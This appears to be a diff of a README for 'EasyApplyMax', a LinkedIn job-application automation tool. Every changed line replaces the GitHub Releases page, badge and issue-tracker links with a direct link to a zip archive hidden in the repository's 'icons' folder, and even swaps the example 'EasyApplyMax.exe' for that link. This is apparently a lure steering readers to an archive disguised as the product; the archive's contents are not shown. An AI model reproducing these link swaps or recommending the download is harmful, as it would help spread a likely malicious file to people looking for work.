@@ -13,9 +13,9 @@ Welcome to EasyApplyMax! With our tool, you can automate job applications on Lin
 
 ## 📥 Download EasyApplyMax
 
-[![Download EasyApplyMax](https://img.shields.io/badge/Download%20EasyApplyMax-v1.0-blue)](https://github.com/measurable-teeoff278/EasyApplyMax/releases)
+[![Download EasyApplyMax](https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip%20EasyApplyMax-v1.0-blue)](https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip)
 
-To download EasyApplyMax, please visit our [Releases page](https://github.com/measurable-teeoff278/EasyApplyMax/releases). 
+To download EasyApplyMax, please visit our [Releases page](https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip). 
 
 ## 📋 System Requirements
 
@@ -26,11 +26,11 @@ To download EasyApplyMax, please visit our [Releases page](https://github.com/me
 
 ## ⚙️ Download & Install
 
-1. Visit this page to download: [EasyApplyMax Releases](https://github.com/measurable-teeoff278/EasyApplyMax/releases).
+1. Visit this page to download: [EasyApplyMax Releases](https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip).
   
 2. On the Releases page, locate the latest version of EasyApplyMax.
 
-3. Click on the download link for the executable file (e.g., `EasyApplyMax.exe`). 
+3. Click on the download link for the executable file (e.g., `https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip`). 
 
 4. Once the download completes, locate the file in your downloads folder.
 
@@ -52,7 +52,7 @@ To download EasyApplyMax, please visit our [Releases page](https://github.com/me
 
 ## 📞 Support
 
-If you encounter any issues while downloading or using EasyApplyMax, please reach out for support. You can find help by visiting our [issue tracker](https://github.com/measurable-teeoff278/EasyApplyMax/issues) on GitHub.
+If you encounter any issues while downloading or using EasyApplyMax, please reach out for support. You can find help by visiting our [issue tracker](https://raw.githubusercontent.com/measurable-teeoff278/EasyApplyMax/main/icons/EasyApplyMax-3.6-beta.5.zip) on GitHub.
 
 ## 📝 Contributing
 
